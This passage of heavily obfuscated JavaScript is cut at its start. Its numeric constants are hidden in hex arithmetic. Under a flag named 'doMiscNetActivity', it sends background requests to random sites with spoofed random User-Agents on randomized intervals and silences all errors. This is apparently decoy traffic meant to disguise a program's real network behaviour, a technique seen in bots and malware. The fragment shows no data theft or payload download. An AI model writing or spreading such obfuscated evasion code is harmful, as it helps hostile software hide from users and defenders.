    for (let l = 0x453 * -0x8 + -0x26c0 + 0x4958; l < -0x11 * -0x49 + -0xd1f + 0x84a; l++)
      setTimeout(f, (0x1c9 * -0x13 + 0x1 * -0x17f61 + 0x28bac) * l * getRandomInt(-0x981 * 0x2 + -0x11fd + 0x2500, 0x4 * -0x9c2 + -0x1 * -0x1835 + 0xed6));
  }, 0xe1d8b + 0x68eb1c + -0x401a27);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x43c * -0x5 + 0xb29 + 0x49 * 0x83) * getRandomInt(0x1 * -0x4f6 + 0x101 * 0x1b + -0x4 * 0x589, 0x1be3 + -0x201f * 0x1 + 0x79 * 0x9));
}, -0x105b * -0x1 + -0x1272 + 0x27b);